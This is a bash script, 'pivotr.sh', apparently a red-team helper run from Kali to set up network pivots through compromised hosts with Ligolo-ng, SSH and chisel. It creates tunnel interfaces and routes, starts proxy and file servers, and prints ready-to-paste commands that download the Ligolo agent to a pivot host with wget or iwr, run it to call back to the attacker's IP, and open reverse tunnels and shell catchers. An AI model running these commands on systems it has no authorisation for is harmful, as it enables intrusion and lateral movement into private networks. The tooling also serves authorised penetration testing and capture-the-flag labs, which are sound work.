#!/usr/bin/env bash
#==============================================================================
# pivotr.sh — Kali-side Pivot Setup and Reference Assistant
#==============================================================================
# Runs on KALI ONLY. Sets up tunnels, generates copy-paste commands.
# Does NOT run on compromised hosts. Does NOT exploit anything.
#
# USAGE:
#   ./pivotr.sh ligolo   --subnet 10.10.10.0/24 [--pivot-ip IP] [--serve]
#   ./pivotr.sh ligolo2  --subnet 172.16.1.0/24
#   ./pivotr.sh listener --port 4444 [--port 80]
#   ./pivotr.sh ssh      --type dynamic --pivot-ip 10.10.10.5 --pivot-user user
#   ./pivotr.sh chisel   --kali-ip 10.10.14.1 --type socks
#   ./pivotr.sh status
#   ./pivotr.sh teardown [--all]
#
# DESIGN:
#   - set -o pipefail; NOT set -e, NOT set -u
#   - Graceful degradation: warn + skip if tool missing, never crash
#   - All generated commands are fully resolved — no unfilled placeholders
#   - Clean Ctrl+C teardown of all background processes
#==============================================================================

set -o pipefail

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS  (matches toolkit exactly)
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
[[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors

TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"

ts()      { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*" >&2; }
phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }

STATE_DIR="${TOOLKIT_ROOT}/pivots"
STATE_FILE="${STATE_DIR}/state.tsv"

#------------------------------------------------------------------------------
# PID TRACKING  (for clean teardown)
#------------------------------------------------------------------------------
declare -a BG_PIDS=()
declare -a BG_LABELS=()

register_bg() {
    # $1=pid $2=label
    BG_PIDS+=("$1")
    BG_LABELS+=("$2")
    mkdir -p -- "$STATE_DIR"
    printf 'process\t%s\t%s\n' "$1" "$2" >> "$STATE_FILE"
}

record_state() {
    mkdir -p -- "$STATE_DIR"
    printf '%s\t%s\t%s\n' "$1" "$2" "$3" >> "$STATE_FILE"
}

remove_state_entry() {
    local kind="$1"
    local value="$2"
    [[ -f "$STATE_FILE" ]] || return 0

    local tmp_file
    tmp_file="$(mktemp)"
    awk -F'\t' -v kind="$kind" -v value="$value" '!(($1 == kind) && ($2 == value))' "$STATE_FILE" > "$tmp_file"
    mv "$tmp_file" "$STATE_FILE"
}

get_state_entries() {
    local kind="$1"
    [[ -f "$STATE_FILE" ]] || return 0
    awk -F'\t' -v kind="$kind" '$1 == kind { print $2 "\t" $3 }' "$STATE_FILE"
}

#------------------------------------------------------------------------------
# CLEANUP / TRAP
#------------------------------------------------------------------------------
cleanup() {
    local exit_code="${1:-0}"
    if [[ ${#BG_PIDS[@]} -gt 0 ]]; then
        echo ""
        info "Cleaning up background processes..."
        local i
        for i in "${!BG_PIDS[@]}"; do
            local pid="${BG_PIDS[$i]}"
            local label="${BG_LABELS[$i]}"
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" 2>/dev/null
                success "Killed ${label} (PID ${pid})"
            fi
            remove_state_entry "process" "$pid"
        done
    fi
    exit "$exit_code"
}

trap 'cleanup 130' INT TERM
trap 'cleanup 0'   EXIT

#------------------------------------------------------------------------------
# KALI IP AUTO-DETECTION
#------------------------------------------------------------------------------
detect_kali_ip() {
    local ip
    ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)[\d.]+' | head -1)
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return 0
    fi
    ip=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)[\d.]+' | head -1)
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return 0
    fi
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return 0
    fi
    return 1
}

#------------------------------------------------------------------------------
# LIGOLO PROXY BINARY SEARCH
#------------------------------------------------------------------------------
find_ligolo_proxy() {
    local candidates=(
        "ligolo-proxy"
        "./ligolo-proxy"
        "/usr/bin/ligolo-proxy"
        "/usr/local/bin/ligolo-proxy"
        "/opt/ligolo-ng/ligolo-proxy"
        "$HOME/tools/ligolo-ng/ligolo-proxy"
    )
    local c
    for c in "${candidates[@]}"; do
        if command -v "$c" &>/dev/null 2>&1 || [[ -x "$c" ]]; then
            echo "$c"
            return 0
        fi
    done
    return 1
}

#------------------------------------------------------------------------------
# LIGOLO AGENT BINARY SEARCH
#------------------------------------------------------------------------------
find_agent_binary() {
    local os="$1"   # linux or windows
    local candidates=()

    if [[ "$os" == "linux" ]]; then
        # Check apt-installed common-binaries package first
        if [[ -d /usr/share/ligolo-ng-common-binaries ]]; then
            while IFS= read -r -d '' f; do
                candidates+=("$f")
            done < <(find /usr/share/ligolo-ng-common-binaries -name "ligolo-ng_agent_*_linux_amd64" -print0 2>/dev/null)
        fi
        candidates+=(
            "./agent"
            "$HOME/tools/ligolo-ng/agent"
            "/opt/ligolo-ng/agent"
            "/usr/share/ligolo-ng/agent"
        )
    else
        if [[ -d /usr/share/ligolo-ng-common-binaries ]]; then
            while IFS= read -r -d '' f; do
                candidates+=("$f")
            done < <(find /usr/share/ligolo-ng-common-binaries -name "ligolo-ng_agent_*_windows_amd64.exe" -print0 2>/dev/null)
        fi
        candidates+=(
            "./agent.exe"
            "$HOME/tools/ligolo-ng/agent.exe"
            "/opt/ligolo-ng/agent.exe"
        )
    fi

    local c
    for c in "${candidates[@]}"; do
        if [[ -f "$c" ]]; then
            echo "$c"
            return 0
        fi
    done
    return 1
}

#------------------------------------------------------------------------------
# INPUT VALIDATION HELPERS
#------------------------------------------------------------------------------
is_valid_ip() {
    local ip="$1"
    local octet
    local IFS='.'
    read -ra parts <<< "$ip"
    [[ ${#parts[@]} -eq 4 ]] || return 1
    for octet in "${parts[@]}"; do
        [[ "$octet" =~ ^[0-9]+$ ]]       || return 1
        (( 10#$octet <= 255 ))            || return 1
    done
    return 0
}

is_valid_cidr() {
    local cidr="$1"
    local ip prefix
    ip="${cidr%/*}"
    prefix="${cidr#*/}"
    is_valid_ip "$ip"                     || return 1
    [[ "$prefix" =~ ^[0-9]+$ ]]           || return 1
    (( 10#$prefix <= 32 ))                || return 1
    return 0
}

is_valid_port() {
    local p="$1"
    [[ "$p" =~ ^[0-9]+$ ]] || return 1
    (( 10#$p >= 1 && 10#$p <= 65535 ))
}

is_positive_integer() {
    [[ "$1" =~ ^[1-9][0-9]*$ ]]
}

wait_for_tcp_listener() {
    local address="$1"
    local timeout_seconds="${2:-5}"
    local waited=0

    while (( waited < timeout_seconds * 10 )); do
        if ss -ltn 2>/dev/null | awk '{print $4}' | grep -Fxq "$address"; then
            return 0
        fi
        sleep 0.1
        ((waited++))
    done
    return 1
}

#------------------------------------------------------------------------------
# TUN INTERFACE HELPERS
#------------------------------------------------------------------------------
tun_exists() {
    ip link show "$1" &>/dev/null
}

route_exists() {
    ip route show | grep -qF "$1"
}

create_tun() {
    local tun_name="$1"
    if tun_exists "$tun_name"; then
        info "TUN interface ${BOLD}${tun_name}${NC} already exists — skipping creation"
        return 0
    fi
    info "Creating TUN interface ${BOLD}${tun_name}${NC} (requires sudo)..."
    sudo ip tuntap add user "$(whoami)" mode tun "$tun_name" || {
        error "Failed to create TUN interface ${tun_name}"
        return 1
    }
    sudo ip link set "$tun_name" up || {
        error "Failed to bring up TUN interface ${tun_name}"
        return 1
    }
    record_state "tun" "$tun_name" ""
    success "TUN interface ${tun_name} created and UP"
}

add_route() {
    local subnet="$1"
    local tun_name="$2"
    if route_exists "$subnet"; then
        warn "Route ${subnet} already exists — skipping"
        return 0
    fi
    info "Adding route ${BOLD}${subnet}${NC} via ${tun_name} (requires sudo)..."
    sudo ip route add "$subnet" dev "$tun_name" || {
        error "Failed to add route ${subnet} dev ${tun_name}"
        return 1
    }
    record_state "route" "$subnet" "$tun_name"
    success "Route ${subnet} → ${tun_name} added"
}

#------------------------------------------------------------------------------
# BOX PRINTER  (for NEXT STEPS output)
#------------------------------------------------------------------------------
print_box() {
    # $1 = title, remaining args = lines (empty string = blank line)
    local title="$1"
    shift
    local lines=("$@")
    local width=65

    local bar
    bar=$(printf '─%.0s' $(seq 1 $width))

    echo ""
    echo -e "${CYAN}${BOLD}┌${bar}┐${NC}"
    printf "${CYAN}${BOLD}│${NC}  %-$((width - 2))s${CYAN}${BOLD}│${NC}\n" "$title"
    echo -e "${CYAN}${BOLD}├${bar}┤${NC}"
    local line
    for line in "${lines[@]}"; do
        if [[ -z "$line" ]]; then
            printf "${CYAN}${BOLD}│${NC}  %-$((width - 2))s${CYAN}${BOLD}│${NC}\n" ""
        else
            printf "${CYAN}${BOLD}│${NC}  ${GREEN}%-$((width - 2))s${CYAN}${BOLD}│${NC}\n" "$line"
        fi
    done
    echo -e "${CYAN}${BOLD}└${bar}┘${NC}"
    echo ""
}

#==============================================================================
# MODE: ligolo
#==============================================================================
mode_ligolo() {
    local subnet=""
    local pivot_ip=""
    local port=11601
    local tun_name="ligolo"
    local kali_ip=""
    local serve=false
    local serve_port=80

    # Parse args
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --subnet)
                [[ $# -lt 2 ]] && { error "--subnet requires an argument"; return 1; }
                subnet="$2"; shift 2 ;;
            --pivot-ip)
                [[ $# -lt 2 ]] && { error "--pivot-ip requires an argument"; return 1; }
                pivot_ip="$2"; shift 2 ;;
            --port)
                [[ $# -lt 2 ]] && { error "--port requires an argument"; return 1; }
                port="$2"; shift 2 ;;
            --tun-name)
                [[ $# -lt 2 ]] && { error "--tun-name requires an argument"; return 1; }
                tun_name="$2"; shift 2 ;;
            --kali-ip)
                [[ $# -lt 2 ]] && { error "--kali-ip requires an argument"; return 1; }
                kali_ip="$2"; shift 2 ;;
            --serve)
                serve=true; shift ;;
            --serve-port)
                [[ $# -lt 2 ]] && { error "--serve-port requires an argument"; return 1; }
                serve_port="$2"; shift 2 ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    # Validate
    [[ -z "$subnet" ]] && { error "--subnet CIDR is required"; return 1; }
    is_valid_cidr "$subnet" || { error "Invalid CIDR: $subnet"; return 1; }
    is_valid_port "$port"   || { error "Invalid port: $port"; return 1; }
    if [[ -n "$pivot_ip" ]]; then
        is_valid_ip "$pivot_ip" || { error "Invalid pivot IP: $pivot_ip"; return 1; }
    fi
    if [[ -n "$kali_ip" ]]; then
        is_valid_ip "$kali_ip" || { error "Invalid Kali IP: $kali_ip"; return 1; }
    fi

    phase "Ligolo-ng Single Pivot Setup"

    # 1. Kali IP
    if [[ -z "$kali_ip" ]]; then
        kali_ip=$(detect_kali_ip) || {
            error "Could not auto-detect Kali IP. Pass --kali-ip manually."
            return 1
        }
        info "Kali IP: ${BOLD}${kali_ip}${NC} (auto-detected)"
    else
        info "Kali IP: ${BOLD}${kali_ip}${NC} (manual)"
    fi

    # 2. Find proxy binary
    local proxy_bin
    proxy_bin=$(find_ligolo_proxy) || {
        error "ligolo-proxy not found. Install with:"
        error "  sudo apt install ligolo-ng"
        error "  or: https://github.com/nicocha30/ligolo-ng/releases"
        return 1
    }
    info "Proxy binary: ${BOLD}${proxy_bin}${NC}"

    # 3. Create TUN interface
    phase "TUN Interface"
    create_tun "$tun_name" || return 1

    # 4. Add route
    phase "Routing"
    add_route "$subnet" "$tun_name" || return 1

    # 5. Start proxy
    phase "Starting Ligolo Proxy"
    info "Starting: ${proxy_bin} -nobanner -selfcert -laddr 0.0.0.0:${port}"
    "$proxy_bin" -nobanner -selfcert -laddr "0.0.0.0:${port}" &
    local proxy_pid=$!
    if ! wait_for_tcp_listener "0.0.0.0:${port}" 5 && ! wait_for_tcp_listener "*:${port}" 5; then
        error "Proxy failed to start. Check if port ${port} is already in use."
        return 1
    fi
    register_bg "$proxy_pid" "ligolo-proxy"
    success "Ligolo proxy listening on 0.0.0.0:${port}"

    # 6. Optional file server
    local serve_url=""
    if [[ "$serve" == true ]]; then
        phase "File Server"
        is_valid_port "$serve_port" || { error "Invalid serve port: $serve_port"; return 1; }
        local serve_dir
        serve_dir="$(pwd)"

        # Find agent binaries and symlink/note their paths
        local agent_linux agent_win
        agent_linux=$(find_agent_binary "linux")  || true
        agent_win=$(find_agent_binary "windows")  || true

        if [[ -n "$agent_linux" ]]; then
            info "Linux agent found: ${agent_linux}"
            [[ ! -f "${serve_dir}/agent" && "$agent_linux" != "${serve_dir}/agent" ]] && \
                ln -sf "$agent_linux" "${serve_dir}/agent" 2>/dev/null && \
                info "Symlinked agent → ${serve_dir}/agent"
        else
            warn "Linux agent binary not found. Install: sudo apt install ligolo-ng"
        fi
        if [[ -n "$agent_win" ]]; then
            info "Windows agent found: ${agent_win}"
            [[ ! -f "${serve_dir}/agent.exe" && "$agent_win" != "${serve_dir}/agent.exe" ]] && \
                ln -sf "$agent_win" "${serve_dir}/agent.exe" 2>/dev/null && \
                info "Symlinked agent.exe → ${serve_dir}/agent.exe"
        else
            warn "Windows agent binary not found. Install: sudo apt install ligolo-ng-common-binaries"
        fi

        local http_err="${STATE_DIR}/http_server.err"
        python3 -m http.server "$serve_port" --directory "$serve_dir" >/dev/null 2>"$http_err" &
        local srv_pid=$!
        sleep 0.3
        if kill -0 "$srv_pid" 2>/dev/null; then
            register_bg "$srv_pid" "http.server"
            serve_url="http://${kali_ip}:${serve_port}"
            success "File server running (PID ${srv_pid}): ${serve_url}"
        else
            warn "http.server failed to start on port ${serve_port}"
            [[ -s "$http_err" ]] && warn "  $(head -1 "$http_err")"
        fi
    fi

    # 7. NEXT STEPS box
    local agent_dl_linux agent_dl_win
    if [[ -n "$serve_url" ]]; then
        agent_dl_linux="wget ${serve_url}/agent -O /tmp/agent && chmod +x /tmp/agent"
        agent_dl_win="iwr ${serve_url}/agent.exe -O agent.exe"
    elif [[ -n "$pivot_ip" ]]; then
        agent_dl_linux="wget http://${kali_ip}:${serve_port}/agent -O /tmp/agent && chmod +x /tmp/agent"
        agent_dl_win="iwr http://${kali_ip}:${serve_port}/agent.exe -O agent.exe"
    else
        agent_dl_linux="# Start file server: ./pivotr.sh ligolo ... --serve"
        agent_dl_win="# Start file server: ./pivotr.sh ligolo ... --serve"
    fi

    print_box "LIGOLO SETUP COMPLETE — NEXT STEPS" \
        "1. Transfer agent to pivot host:" \
        "" \
        "   Linux:   ${agent_dl_linux}" \
        "   Windows: ${agent_dl_win}" \
        "" \
        "2. Run agent on pivot host:" \
        "" \
        "   Linux:   /tmp/agent -connect ${kali_ip}:${port} -ignore-cert" \
        "   Windows: .\\agent.exe -connect ${kali_ip}:${port} -ignore-cert" \
        "" \
        "3. In Ligolo console (when agent connects):" \
        "   session       → select the agent" \
        "   ifconfig      → confirm internal interface" \
        "   start         → activate tunnel" \
        "" \
        "4. Verify tunnel (from new Kali terminal):" \
        "   nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>" \
        "" \
        "TIP: Access pivot localhost via 240.0.0.1 (Ligolo magic IP)" \
        "TIP: v0.8+ autoroute may handle routes — manual is reliable" \
        "TIP: In console: interface_create --name ligolo (v0.6+)"

    info "Proxy PID ${proxy_pid} — press Ctrl+C to stop and clean up"
    # Keep script alive while proxy runs (user will Ctrl+C when done)
    wait "$proxy_pid" 2>/dev/null || true
}

#==============================================================================
# MODE: ligolo2
#==============================================================================
mode_ligolo2() {
    local subnet=""
    local tun_name="ligolo2"

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --subnet)
                [[ $# -lt 2 ]] && { error "--subnet requires an argument"; return 1; }
                subnet="$2"; shift 2 ;;
            --tun-name)
                [[ $# -lt 2 ]] && { error "--tun-name requires an argument"; return 1; }
                tun_name="$2"; shift 2 ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    [[ -z "$subnet" ]] && { error "--subnet CIDR is required"; return 1; }
    is_valid_cidr "$subnet" || { error "Invalid CIDR: $subnet"; return 1; }

    phase "Ligolo-ng Double Pivot Setup"

    create_tun "$tun_name" || return 1
    add_route "$subnet" "$tun_name" || return 1

    print_box "DOUBLE PIVOT — NEXT STEPS" \
        "In Ligolo console, on SESSION 1 (first pivot):" \
        "" \
        "   listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp" \
        "   listener_list   (verify it appears)" \
        "" \
        "On second pivot host — run agent connecting THROUGH first pivot:" \
        "" \
        "   Linux:   /tmp/agent -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert" \
        "   Windows: .\\agent.exe -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert" \
        "" \
        "In Ligolo console, SESSION 2 (second pivot):" \
        "" \
        "   tunnel_start --tun ${tun_name}" \
        "" \
        "TIP: 240.0.0.1 = pivot1 localhost (Ligolo magic IP)" \
        "TIP: Use 240.0.0.2 = pivot2 localhost if double-nested"
}

#==============================================================================
# MODE: listener
#==============================================================================
mode_listener() {
    local -a ports=()
    local type="both"

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)
                [[ $# -lt 2 ]] && { error "--port requires an argument"; return 1; }
                is_valid_port "$2" || { error "Invalid port: $2"; return 1; }
                ports+=("$2"); shift 2 ;;
            --type)
                [[ $# -lt 2 ]] && { error "--type requires an argument"; return 1; }
                type="$2"; shift 2 ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    [[ ${#ports[@]} -eq 0 ]] && { error "At least one --port is required"; return 1; }
    case "$type" in
        shell|file|both) ;;
        *) error "Invalid --type: ${type}. Use shell, file, or both"; return 1 ;;
    esac

    phase "Ligolo Listener Commands"

    echo ""
    echo -e "${BOLD}${CYAN}═══ PASTE INTO LIGOLO CONSOLE ══════════════════════════════${NC}"
    local p
    for p in "${ports[@]}"; do
        echo -e "${GREEN}  listener_add --addr 0.0.0.0:${p} --to 127.0.0.1:${p} --tcp${NC}"
    done
    echo -e "${CYAN}  listener_list${NC}   ← verify"
    echo ""

    if [[ "$type" == "shell" || "$type" == "both" ]]; then
        echo -e "${BOLD}${CYAN}═══ SHELL CATCHERS (run on Kali) ═══════════════════════════${NC}"
        for p in "${ports[@]}"; do
            echo -e "${GREEN}  penelope -p ${p} -O${NC}"
        done
        echo ""
    fi

    if [[ "$type" == "file" || "$type" == "both" ]]; then
        echo -e "${BOLD}${CYAN}═══ FILE SERVER (run on Kali) ═══════════════════════════════${NC}"
        for p in "${ports[@]}"; do
            echo -e "${GREEN}  python3 -m http.server ${p}${NC}  # serves current directory"
        done
        echo ""
    fi

    echo -e "${YELLOW}[!] Reverse shell must connect to KALI_IP:PORT — ligolo forwards it${NC}"
}

#==============================================================================
# MODE: ssh
#==============================================================================
mode_ssh() {
    local type=""
    local pivot_ip=""
    local pivot_user
    pivot_user="$(whoami)"
    local pivot_port=22
    local target_ip=""
    local target_port=""
    local local_port=""
    local kali_ip=""
    local kali_user="kali"
    local socks_port=9999

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --type)
                [[ $# -lt 2 ]] && { error "--type requires an argument"; return 1; }
                type="$2"; shift 2 ;;
            --pivot-ip)
                [[ $# -lt 2 ]] && { error "--pivot-ip requires an argument"; return 1; }
                pivot_ip="$2"; shift 2 ;;
            --pivot-user)
                [[ $# -lt 2 ]] && { error "--pivot-user requires an argument"; return 1; }
                pivot_user="$2"; shift 2 ;;
            --pivot-port)
                [[ $# -lt 2 ]] && { error "--pivot-port requires an argument"; return 1; }
                pivot_port="$2"; shift 2 ;;
            --target-ip)
                [[ $# -lt 2 ]] && { error "--target-ip requires an argument"; return 1; }
                target_ip="$2"; shift 2 ;;
            --target-port)
                [[ $# -lt 2 ]] && { error "--target-port requires an argument"; return 1; }
                target_port="$2"; shift 2 ;;
            --local-port)
                [[ $# -lt 2 ]] && { error "--local-port requires an argument"; return 1; }
                local_port="$2"; shift 2 ;;
            --kali-ip)
                [[ $# -lt 2 ]] && { error "--kali-ip requires an argument"; return 1; }
                kali_ip="$2"; shift 2 ;;
            --kali-user)
                [[ $# -lt 2 ]] && { error "--kali-user requires an argument"; return 1; }
                kali_user="$2"; shift 2 ;;
            --socks-port)
                [[ $# -lt 2 ]] && { error "--socks-port requires an argument"; return 1; }
                socks_port="$2"; shift 2 ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    [[ -z "$type" ]] && { error "--type is required (local|dynamic|remote|remote-dynamic)"; return 1; }
    case "$type" in
        local|dynamic|remote|remote-dynamic) ;;
        *) error "Invalid type: ${type}. Use local, dynamic, remote, or remote-dynamic"; return 1 ;;
    esac

    # Auto-detect Kali IP if needed
    if [[ -z "$kali_ip" ]]; then
        kali_ip=$(detect_kali_ip) || {
            error "Could not auto-detect Kali IP. Pass --kali-ip manually."
            return 1
        }
    fi

    # Validate
    [[ -n "$pivot_ip" ]] && { is_valid_ip "$pivot_ip" || { error "Invalid pivot IP: $pivot_ip"; return 1; }; }
    is_valid_port "$pivot_port" || { error "Invalid pivot port: $pivot_port"; return 1; }
    [[ -n "$target_ip" ]]   && { is_valid_ip "$target_ip" || { error "Invalid target IP: $target_ip"; return 1; }; }
    [[ -n "$target_port" ]] && { is_valid_port "$target_port" || { error "Invalid target port: $target_port"; return 1; }; }
    [[ -n "$local_port" ]]  && { is_valid_port "$local_port" || { error "Invalid local port: $local_port"; return 1; }; }
    [[ -n "$kali_ip" ]]     && { is_valid_ip "$kali_ip" || { error "Invalid Kali IP: $kali_ip"; return 1; }; }
    is_valid_port "$socks_port" || { error "Invalid socks port: $socks_port"; return 1; }

    phase "SSH Tunnel Reference: ${type}"

    echo ""
    local sep
    sep=$(printf '─%.0s' $(seq 1 60))

    case "$type" in
        local)
            [[ -z "$pivot_ip" ]]    && { error "--pivot-ip required for local tunnel"; return 1; }
            [[ -z "$target_ip" ]]   && { error "--target-ip required for local tunnel"; return 1; }
            [[ -z "$target_port" ]] && { error "--target-port required for local tunnel"; return 1; }
            [[ -z "$local_port" ]]  && local_port="$target_port"

            echo -e "${CYAN}${BOLD}LOCAL PORT FORWARD${NC}"
            echo -e "${BOLD}Effect:${NC} Kali:${local_port} → ${pivot_ip} → ${target_ip}:${target_port}"
            echo -e "${BOLD}Run ON KALI:${NC}"
            echo ""
            echo -e "  ${GREEN}ssh -N -L 0.0.0.0:${local_port}:${target_ip}:${target_port} ${pivot_user}@${pivot_ip} -p ${pivot_port}${NC}"
            echo ""
            echo -e "${BOLD}Then access:${NC}  localhost:${local_port} on Kali"
            ;;

        dynamic)
            [[ -z "$pivot_ip" ]] && { error "--pivot-ip required for dynamic tunnel"; return 1; }

            echo -e "${CYAN}${BOLD}DYNAMIC SOCKS PROXY${NC}"
            echo -e "${BOLD}Effect:${NC} SOCKS5 on Kali:${socks_port} — all traffic routed through ${pivot_ip}"
            echo -e "${BOLD}Run ON KALI:${NC}"
            echo ""
            echo -e "  ${GREEN}ssh -N -D 0.0.0.0:${socks_port} ${pivot_user}@${pivot_ip} -p ${pivot_port}${NC}"
            echo ""
            echo -e "${BOLD}proxychains.conf:${NC}"
            echo -e "  ${YELLOW}socks5 127.0.0.1 ${socks_port}${NC}"
            echo ""
            echo -e "${RED}${BOLD}[!] proxychains scans MUST use: nmap -sT -Pn (no SYN, no ping)${NC}"
            ;;

        remote)
            [[ -z "$target_ip" ]]   && { error "--target-ip required for remote tunnel"; return 1; }
            [[ -z "$target_port" ]] && { error "--target-port required for remote tunnel"; return 1; }
            [[ -z "$local_port" ]]  && local_port="$target_port"

            echo -e "${CYAN}${BOLD}REMOTE PORT FORWARD${NC}"
            echo -e "${BOLD}Effect:${NC} Pivot connects to Kali — Kali:${local_port} exposes ${target_ip}:${target_port}"
            echo -e "${BOLD}Run ON PIVOT:${NC}"
            echo ""
            echo -e "  ${GREEN}ssh -N -R 127.0.0.1:${local_port}:${target_ip}:${target_port} ${kali_user}@${kali_ip}${NC}"
            echo ""
            echo -e "${BOLD}Then access on Kali:${NC}  localhost:${local_port}"
            echo ""
            echo -e "${YELLOW}[!] Ensure Kali sshd is running: sudo systemctl start ssh${NC}"
            ;;

        remote-dynamic)
            echo -e "${CYAN}${BOLD}REVERSE DYNAMIC SOCKS (REMOTE SOCKS)${NC}"
            echo -e "${BOLD}Effect:${NC} Pivot connects back — SOCKS5 on Kali:${socks_port}"
            echo -e "${BOLD}Run ON PIVOT:${NC}"
            echo ""
            echo -e "  ${GREEN}ssh -N -R ${socks_port} ${kali_user}@${kali_ip}${NC}"
            echo ""
            echo -e "${BOLD}proxychains.conf:${NC}"
            echo -e "  ${YELLOW}socks5 127.0.0.1 ${socks_port}${NC}"
            echo ""
            echo -e "${RED}${BOLD}[!] proxychains scans MUST use: nmap -sT -Pn (no SYN, no ping)${NC}"
            echo -e "${YELLOW}[!] Ensure Kali sshd is running: sudo systemctl start ssh${NC}"
            ;;
    esac

    echo -e "${CYAN}${sep}${NC}"
    echo ""
}

#==============================================================================
# MODE: chisel
#==============================================================================
mode_chisel() {
    local kali_ip=""
    local port=8080
    local type="socks"
    local local_port=""
    local target_ip=""
    local target_port=""
    local start_server=false
    local socks_port=9999

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --kali-ip)
                [[ $# -lt 2 ]] && { error "--kali-ip requires an argument"; return 1; }
                kali_ip="$2"; shift 2 ;;
            --port)
                [[ $# -lt 2 ]] && { error "--port requires an argument"; return 1; }
                port="$2"; shift 2 ;;
            --type)
                [[ $# -lt 2 ]] && { error "--type requires an argument"; return 1; }
                type="$2"; shift 2 ;;
            --local-port)
                [[ $# -lt 2 ]] && { error "--local-port requires an argument"; return 1; }
                local_port="$2"; shift 2 ;;
            --target-ip)
                [[ $# -lt 2 ]] && { error "--target-ip requires an argument"; return 1; }
                target_ip="$2"; shift 2 ;;
            --target-port)
                [[ $# -lt 2 ]] && { error "--target-port requires an argument"; return 1; }
                target_port="$2"; shift 2 ;;
            --socks-port)
                [[ $# -lt 2 ]] && { error "--socks-port requires an argument"; return 1; }
                socks_port="$2"; shift 2 ;;
            --start-server)
                start_server=true; shift ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    case "$type" in
        socks|forward) ;;
        *) error "Invalid --type: ${type}. Use socks or forward"; return 1 ;;
    esac

    is_valid_port "$port" || { error "Invalid chisel port: $port"; return 1; }
    [[ -n "$local_port" ]]  && { is_valid_port "$local_port" || { error "Invalid local port: $local_port"; return 1; }; }
    [[ -n "$target_ip" ]]   && { is_valid_ip "$target_ip" || { error "Invalid target IP: $target_ip"; return 1; }; }
    [[ -n "$target_port" ]] && { is_valid_port "$target_port" || { error "Invalid target port: $target_port"; return 1; }; }
    is_valid_port "$socks_port" || { error "Invalid socks port: $socks_port"; return 1; }

    if ! command -v chisel &>/dev/null; then
        warn "chisel not found in PATH"
        warn "Download: https://github.com/jpillora/chisel/releases"
    fi

    if [[ -z "$kali_ip" ]]; then
        kali_ip=$(detect_kali_ip) || {
            error "Could not auto-detect Kali IP. Pass --kali-ip manually."
            return 1
        }
    fi

    phase "Chisel Tunnel Reference: ${type}"

    echo ""
    case "$type" in
        socks)
            local -a server_cmd=(chisel server -p "$port" --socks5 --reverse)
            local client_cmd="chisel client ${kali_ip}:${port} R:${socks_port}:socks"

            echo -e "${BOLD}Run ON KALI:${NC}"
            echo -e "  ${GREEN}${server_cmd[*]}${NC}"
            echo ""
            echo -e "${BOLD}Run ON PIVOT:${NC}"
            echo -e "  ${GREEN}${client_cmd}${NC}"
            echo ""
            echo -e "${BOLD}proxychains.conf:${NC}"
            echo -e "  ${YELLOW}socks5 127.0.0.1 ${socks_port}${NC}"
            echo ""
            echo -e "${RED}${BOLD}[!] proxychains scans MUST use: nmap -sT -Pn (no SYN, no ping)${NC}"

            if [[ "$start_server" == true ]]; then
                info "Starting chisel server..."
                "${server_cmd[@]}" &>/dev/null &
                local spid=$!
                sleep 0.5
                if kill -0 "$spid" 2>/dev/null; then
                    register_bg "$spid" "chisel-server"
                    success "Chisel server running (PID ${spid}) on port ${port}"
                    info "Press Ctrl+C to stop"
                    wait "$spid" 2>/dev/null || true
                else
                    error "Chisel server failed to start"
                fi
            fi
            ;;

        forward)
            [[ -z "$target_ip" ]]   && { error "--target-ip required for forward type"; return 1; }
            [[ -z "$target_port" ]] && { error "--target-port required for forward type"; return 1; }
            [[ -z "$local_port" ]]  && local_port="$target_port"

            local -a server_cmd=(chisel server -p "$port" --reverse)
            local client_cmd="chisel client ${kali_ip}:${port} R:${local_port}:${target_ip}:${target_port}"

            echo -e "${BOLD}Effect:${NC} Kali:${local_port} → pivot → ${target_ip}:${target_port}"
            echo ""
            echo -e "${BOLD}Run ON KALI:${NC}"
            echo -e "  ${GREEN}${server_cmd[*]}${NC}"
            echo ""
            echo -e "${BOLD}Run ON PIVOT:${NC}"
            echo -e "  ${GREEN}${client_cmd}${NC}"
            echo ""
            echo -e "${BOLD}Then access on Kali:${NC}  localhost:${local_port}"

            if [[ "$start_server" == true ]]; then
                info "Starting chisel server..."
                "${server_cmd[@]}" &>/dev/null &
                local spid=$!
                sleep 0.5
                if kill -0 "$spid" 2>/dev/null; then
                    register_bg "$spid" "chisel-server"
                    success "Chisel server running (PID ${spid}) on port ${port}"
                    info "Press Ctrl+C to stop"
                    wait "$spid" 2>/dev/null || true
                else
                    error "Chisel server failed to start"
                fi
            fi
            ;;
    esac
    echo ""
}

